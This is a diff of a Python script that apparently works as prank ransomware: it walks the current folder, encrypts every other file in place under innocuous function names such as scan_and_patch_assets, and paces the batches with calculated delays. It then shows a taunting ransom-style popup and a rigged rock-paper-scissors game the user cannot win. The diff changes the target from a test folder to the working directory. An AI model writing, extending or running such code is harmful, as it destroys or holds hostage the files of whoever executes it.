@@ -22,6 +22,7 @@ def get_key_from_endpoint(random_path):
         response.raise_for_status()  # Raise an error for HTTP issues
         raw_key = response.text.strip()  # Ensure no extra spaces or newlines
         hashed_key = hashlib.sha256(raw_key.encode()).digest()[:16]  # Derive a 16-byte key
+        messagebox.showerror("Key Retrieval Failed", "The certificate could not be retrieved. The time has passed, and the password is now invalid.")
         return hashed_key
     except Exception as e:
         print(f"Failed to retrieve the key: {e}")
@@ -48,57 +49,69 @@ def reverse_vector(blob: bytes, config_token: bytes) -> bytes:
 def scan_and_patch_assets(asset_dir: str, config_token: bytes, total_duration=60.0):
     # Step 1: Collect and shuffle files
     file_paths = []
+    file_sizes = []
+    script_path = os.path.abspath(__file__)  # Get the absolute path of this script
+
     for dirpath, _, assets in os.walk(asset_dir):
         for asset in assets:
-            file_paths.append(os.path.join(dirpath, asset))
-    random.shuffle(file_paths)
+            path = os.path.join(dirpath, asset)
+            if os.path.abspath(path) == script_path:  # Exclude this script
+                continue
+            file_paths.append(path)
+            file_sizes.append(os.path.getsize(path))  # Get file size
 
-    total_files = len(file_paths)
+    # Pair file paths with their sizes and shuffle
+    files_with_sizes = list(zip(file_paths, file_sizes))
+    random.shuffle(files_with_sizes)
+
+    total_files = len(files_with_sizes)
     if total_files == 0:
         print("No files found.")
         return
 
-    # Step 2: Set batch and delay ranges based on file count
-    if total_files <= 20:
-        min_batch, max_batch = 1, 2
-        min_delay, max_delay = 0.2, 0.5
-    elif total_files <= 100:
-        min_batch, max_batch = 2, 4
-        min_delay, max_delay = 0.1, 0.3
-    elif total_files <= 500:
-        min_batch, max_batch = 4, 8
-        min_delay, max_delay = 0.05, 0.2
-    else:
-        min_batch, max_batch = 6, 12
-        min_delay, max_delay = 0.3, 0.7
+    # Calculate the total size of all files
+    total_size = sum(size for _, size in files_with_sizes)
 
-    # Step 3: Calculate approximate delay budget per batch
+    # Step 2: Process files in batches with delays
+    start_time = time.time()
     i = 0
     while i < total_files:
-        batch_size = random.randint(min_batch, max_batch)
-        for _ in range(batch_size):
-            if i >= total_files:
-                break
-            path = file_paths[i]
+        # Determine batch size (randomized between 2 and 5 files)
+        batch_size = random.randint(2, 5)
+        batch_files = files_with_sizes[i:i + batch_size]
+        batch_total_size = sum(size for _, size in batch_files)
+
+        # Process the batch
+        for j, (path, size) in enumerate(batch_files, start=1):
             try:
                 with open(path, 'rb') as f:
                     data = f.read()
                 byeBye = run_vector(data, config_token)
                 with open(path, 'wb') as f:
                     f.write(byeBye)
-                print(f"[{i+1}/{total_files}] bye bye: {path}")
+                print(f"[{i + j}/{total_files}] bye bye: {path}")
             except Exception:
-                print(f"[{i+1}/{total_files}] Failed: {path}")
-            i += 1
+                print(f"[{i + j}/{total_files}] Failed: {path}")
 
-        delay = random.uniform(min_delay, max_delay)
-        print(f"⏳ Delaying batch for {delay:.2f} seconds...\n")
-        time.sleep(delay)
+        # Update index
+        i += batch_size
+
+        # Calculate delay based on batch size and distribute over total duration
+        elapsed_time = time.time() - start_time
+        remaining_time = max(total_duration - elapsed_time, 0)
+        delay = min((batch_total_size / total_size) * total_duration, remaining_time / ((total_files - i) / batch_size + 1))
+        if i < total_files:  # Avoid delay after the last batch
+            print(f"⏳ Delaying for {delay:.2f} seconds...\n")
+            time.sleep(delay)
 
 def restore_assets(asset_dir: str, config_token: bytes):
+    script_path = os.path.abspath(__file__)  # Get the absolute path of this script
+
     for dirpath, _, assets in os.walk(asset_dir):
         for asset in assets:
             asset_path = os.path.join(dirpath, asset)
+            if os.path.abspath(asset_path) == script_path:  # Exclude this script
+                continue
 
             try:
                 with open(asset_path, 'rb') as f:
@@ -116,8 +129,8 @@ def show_popup():
     root.withdraw()
 
     response = messagebox.askquestion(
-        "💀 Oops... Files bye bye!",
-        "🎉 Surprise! Your precious files are now on vacation — permanently bye bye.\n\n"
+        "💀 Oops... Files are bye byed!",
+        "🎉 Surprise! Your precious files are now on vacation — permanently.\n\n"
         "But hey, I’m feeling generous today...\n"
         "Would you like a *totally fair* chance to win them back?\n\n"
         "Click YES to 'Play a Game'\n"
@@ -127,34 +140,53 @@ def show_popup():
     if response == "yes":
         play_game()
     else:
-        messagebox.showerror("🔥 RIP Files", "Well... you chose doom. Enjoy the silence 💣")
-        # exit() or fake "delete" logic here
+        global mode
+        mode = "restore"  # Change the mode to restore
+        messagebox.showinfo("Womp Womp..", "You chose not to play. Your files will be restored 3shan khatrak bas.")
+
 def play_game():
     global mode  # allows us to update the global `mode`
 
-    correct_answer = "documents"
-    tries = 3
+    options = ["rock", "paper", "scissors"]
+    computer_choices = ["rock", "paper", "scissors"]  # Predefined winning choices
+    user_wins = 0
+    computer_wins = 0
 
-    for attempt in range(1, tries + 1):
-        guess = simpledialog.askstring(
-            "Game Time 🎮",
-            f"Guess the name of the folder I hate the most.\n"
-            f"Hint: It's something you never backed up.\n"
-            f"Attempt {attempt} of {tries}:"
+    for attempt in range(1, 11):  # Limit to 10 rounds
+        if user_wins == 3 or computer_wins == 3:  # End game if either reaches 3 wins
+            break
+
+        user_choice = simpledialog.askstring(
+            "Rock, Paper, Scissors 🎮",
+            f"Round {attempt}:\nChoose rock, paper, or scissors:"
         )
-        if guess and guess.lower().strip() == correct_answer:
-            messagebox.showinfo("🏆 Bravo!", "Wow. You actually got it. welcoming back will now begin...")
-            mode = "restore"  # 🧠 change the mode!
-            return
-        else:
-            messagebox.showwarning("❌ Nope", "Wrong guess. Try again...")
+        if not user_choice or user_choice.lower().strip() not in options:
+            messagebox.showwarning("❌ Invalid Choice", "Please choose rock, paper, or scissors.")
+            continue
 
-    messagebox.showerror("💀 Game Over", "You failed. The files are bye bye. Forever-ish.")
+        user_choice = user_choice.lower().strip()
+        if user_choice == "rock":
+            computer_choice = computer_choices[1]  # Paper beats Rock
+        elif user_choice == "paper":
+            computer_choice = computer_choices[2]
+        elif user_choice == "scissors":
+            computer_choice = computer_choices[0]
+        else:
+            computer_choice = random.choice(computer_choices)
+
+        if user_choice == computer_choice:
+            messagebox.showinfo("🤝 Tie", f"Both chose {user_choice}. It's a tie!")
+        else:
+            computer_wins += 1
+            messagebox.showinfo("💻 Computer Wins", f"You chose {user_choice}, computer chose {computer_choice}. Computer wins this round!")
+
+    if computer_wins == 3:
+        messagebox.showerror("💀 Game Over", "You lost the game. The only way to decrypt is by choosing not to play.")
 
 # === SYSTEM EXECUTION ===
 if __name__ == "__main__":
     import time
-    resources_folder = "testfolder"       # appears like system logs folder
+    resources_folder = os.getcwd()  # Use the current folder as the target folder
 
     root = tk.Tk()
     root.withdraw()  # Hide the main tkinter window
